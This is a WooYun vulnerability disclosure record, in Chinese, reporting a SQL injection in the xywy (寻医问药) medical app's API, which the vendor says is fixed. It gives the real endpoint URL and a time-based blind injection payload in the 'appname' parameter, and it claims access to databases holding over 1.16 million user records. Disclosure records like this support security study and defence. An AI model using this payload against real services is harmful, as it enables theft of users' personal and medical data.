{"id": 85670, "wybug_id": "wooyun-2016-0184220", "wybug_title": "寻医问药官方APP存在SQL注入（含116W+用户数据）", "wybug_corp": "寻医问药", "wybug_author": "路人甲", "wybug_date": "2016-03-13 15:40", "wybug_open_date": "2016-03-14 15:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-14：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： APP安全之SQL注入 详细说明：  目标：寻医问药问医生Android APP检测发现以下地方存在SQL注入：\nhttp://api.m.xywy.com/api/?m=Askintegral&act=apply&appname=ask&edition=4.3&model=1&sign=3f36f776d163c6b6c74b1adfdc1b41db\nPayload：\nappname=ask') AND (SELECT * FROM (SELECT(BENCHMARK(2000000,MD5(0x666c5a50))))flZP) AND ('FMij'='FMij\n   漏洞证明：  1、跑出当前数据库用户\n\n2、跑出所有数据库\n\n3、跑出当前库所有表，发现116W+用户数据，具体就不深入了~\n\n   修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-03-13 17:44 厂商回复： 我们在9月21号就发现了这个SQL注入漏洞，同一个注入点，并且提交了详细的安全报告，当时漏洞修复了，不知什么原因又重现了。 最新状态： 2016-03-14：已经修复，即便是在数据库拿到我们的用户密码也是破不出的，不过奇怪的是研发并没有找到user_info*这个表。 2016-03-14：已经修复，不过奇怪的是研发并没有找到user_info*这个表，我们的这个库中也并不存储用户密码，而且在别的库中拿到密码也是破不出的。至于为什么注入点修复后又重现了，是因为运行了一段时间，研发发现app的日志无法正常写入数据库，经查看发现是因为加了全局安全函数影响的，为了不影响日志的写入，研发就暂时撤掉了全局安全函数另想他法。  ", "replys": "漏洞评价：\n评价\n     2016-03-13 16:07 |    \t\t小豹 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:10        | 没有不老的誓言，没有不变的承诺，踏上旅途...)\t\t \n  可以的，兄弟    \n     2016-03-13 16:33 |    \t\tjs2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:33        | 天道酬勤，洞无止境，一挖一世界)\t\t \n  MARK    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}